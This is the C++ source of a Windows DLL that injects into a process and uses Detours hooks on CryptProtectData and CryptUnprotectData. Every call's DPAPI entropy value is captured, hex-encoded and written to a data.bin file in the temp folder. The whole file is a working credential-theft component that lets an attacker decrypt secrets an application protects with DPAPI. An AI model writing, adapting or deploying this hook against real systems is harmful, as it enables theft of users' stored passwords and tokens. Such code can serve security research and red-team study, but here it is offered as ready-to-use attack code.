// dllmain.cpp : Defines the entry point for the DLL application.

#include "stdafx.h"
#include <Windows.h>
#include <detours.h>
#include <dpapi.h>
#include <strsafe.h>
#include <fstream>
#include <string>
#include <sstream>
#include <iomanip>
#include <stdio.h>
#pragma comment(lib, "crypt32.lib")

std::string lpOptionalEntropy;

std::string hexStr(unsigned char* data, int len)
{
	std::stringstream ss;
	ss << std::hex;
	for (int i = 0; i < len; ++i)
		ss << std::setw(2) << std::setfill('0') << (int)data[i];
	return ss.str();
}

void WriteEntropy()
{
	TCHAR TempFolder[MAX_PATH];
	GetEnvironmentVariable(L"TEMP", TempFolder, MAX_PATH);
	TCHAR Path[MAX_PATH];
	StringCbPrintf(Path, MAX_PATH, L"%s\\data.bin", TempFolder);
	std::fstream fs;
	fs.open(Path, std::fstream::in | std::fstream::out | std::fstream::app);
	fs << "\nEntropy:" << lpOptionalEntropy;
	fs.close();
}

static DPAPI_IMP BOOL(WINAPI * OriginalCryptUnprotectData)(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*) = CryptUnprotectData;
static DPAPI_IMP BOOL(WINAPI * OriginalCryptProtectData)(DATA_BLOB*, LPCWSTR, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*) = CryptProtectData;

BOOL _CryptUnprotectData(DATA_BLOB* pDataIn, LPWSTR* ppszDataDescr, DATA_BLOB* pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct, DWORD dwFlags, DATA_BLOB* pDataOut) {
	BYTE * pbData = pOptionalEntropy->pbData;
	int cbData = static_cast <int> (pOptionalEntropy->cbData);
	lpOptionalEntropy = hexStr((unsigned char*)pbData, cbData);
	WriteEntropy();
	return OriginalCryptUnprotectData(pDataIn, ppszDataDescr, pOptionalEntropy, pvReserved, pPromptStruct, dwFlags, pDataOut);
}

BOOL _CryptProtectData(DATA_BLOB* pDataIn, LPCWSTR szDataDescr, DATA_BLOB* pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct, DWORD dwFlags, DATA_BLOB* pDataOut) {
	BYTE* pbData = pOptionalEntropy->pbData;
	int cbData = static_cast <int> (pOptionalEntropy->cbData);
	lpOptionalEntropy = hexStr((unsigned char*)pbData, cbData);
	WriteEntropy();
	return OriginalCryptProtectData(pDataIn, szDataDescr, pOptionalEntropy, pvReserved, pPromptStruct, dwFlags, pDataOut);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  dwReason, LPVOID lpReserved)
{
	if (DetourIsHelperProcess()) {
		return TRUE;
	}

	if (dwReason == DLL_PROCESS_ATTACH) {
		DetourRestoreAfterWith();
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourAttach(&(PVOID&)OriginalCryptUnprotectData, _CryptUnprotectData);
		DetourAttach(&(PVOID&)OriginalCryptProtectData, _CryptProtectData);
		DetourTransactionCommit();
	}
	else if (dwReason == DLL_PROCESS_DETACH) {
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());
		DetourDetach(&(PVOID&)OriginalCryptUnprotectData, _CryptUnprotectData);
		DetourDetach(&(PVOID&)OriginalCryptProtectData, _CryptProtectData);
		DetourTransactionCommit();

	}
	return TRUE;
}
